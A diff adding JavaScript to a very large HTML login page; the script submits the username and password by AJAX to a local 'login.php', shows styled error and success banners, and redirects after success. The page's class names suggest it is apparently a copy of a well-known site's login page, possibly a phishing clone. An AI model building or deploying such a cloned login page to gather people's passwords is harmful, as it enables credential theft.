@@ -18605,6 +18605,119 @@
       }
     </script>
 
+    <!-- AJAX form submission and error handling -->
+    <script>
+      // Function to show error message
+      function showError(message, username) {
+        // Remove any existing error message
+        var existingError = document.querySelector('.error-message');
+        if (existingError) {
+          existingError.remove();
+        }
+
+        // Create error message element
+        var errorDiv = document.createElement('div');
+        errorDiv.className = 'error-message';
+        errorDiv.style.cssText = 'background: #ed4956; color: white; padding: 10px; border-radius: 4px; margin: 10px 0; font-size: 14px; text-align: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;';
+        errorDiv.textContent = message;
+
+        // Insert error message above the form
+        var form = document.getElementById('loginForm');
+        form.parentNode.insertBefore(errorDiv, form);
+
+        // Pre-fill username field if available
+        if (username) {
+          var usernameInput = document.querySelector('input[name="username"]');
+          if (usernameInput) {
+            usernameInput.value = username;
+            // Trigger the input event to update the UI
+            var event = new Event('input', { bubbles: true });
+            usernameInput.dispatchEvent(event);
+          }
+        }
+
+        // Scroll to error message
+        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+
+      // Function to show success message and redirect
+      function showSuccess(message, redirectUrl) {
+        // Remove any existing error message
+        var existingError = document.querySelector('.error-message');
+        if (existingError) {
+          existingError.remove();
+        }
+
+        // Create success message element
+        var successDiv = document.createElement('div');
+        successDiv.className = 'success-message';
+        successDiv.style.cssText = 'background: #00c851; color: white; padding: 10px; border-radius: 4px; margin: 10px 0; font-size: 14px; text-align: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;';
+        successDiv.textContent = message;
+
+        // Insert success message above the form
+        var form = document.getElementById('loginForm');
+        form.parentNode.insertBefore(successDiv, form);
+
+        // Redirect after a short delay
+        setTimeout(function() {
+          window.location.href = redirectUrl;
+        }, 2000);
+      }
+
+      // Function to handle form submission
+      function handleFormSubmit(event) {
+        event.preventDefault();
+
+        // Get form data
+        var formData = new FormData(event.target);
+        var username = formData.get('username');
+        var password = formData.get('password');
+
+        // Show loading state
+        var submitButton = event.target.querySelector('button[type="submit"]');
+        var originalText = submitButton.innerHTML;
+        submitButton.innerHTML = '<div class="q5edG"></div>';
+        submitButton.disabled = true;
+
+        // Submit form via AJAX
+        fetch('login.php', {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          // Re-enable submit button
+          submitButton.innerHTML = originalText;
+          submitButton.disabled = false;
+
+          if (data.redirect) {
+            // Success - show success message and redirect
+            showSuccess(data.message, data.redirect_url);
+          } else {
+            // Error - show error message
+            showError(data.message, data.username);
+          }
+        })
+        .catch(error => {
+          // Re-enable submit button
+          submitButton.innerHTML = originalText;
+          submitButton.disabled = false;
+
+          // Show generic error
+          showError('An error occurred. Please try again.', username);
+          console.error('Error:', error);
+        });
+      }
+
+      // Add form submit event listener
+      document.addEventListener('DOMContentLoaded', function() {
+        var form = document.getElementById('loginForm');
+        if (form) {
+          form.addEventListener('submit', handleFormSubmit);
+        }
+      });
+    </script>
+
     <div class="_-rjm"><div class="tA2fc"></div></div>
     <div class="_5qKD1"><div class="q5edG"></div></div>
   </body>
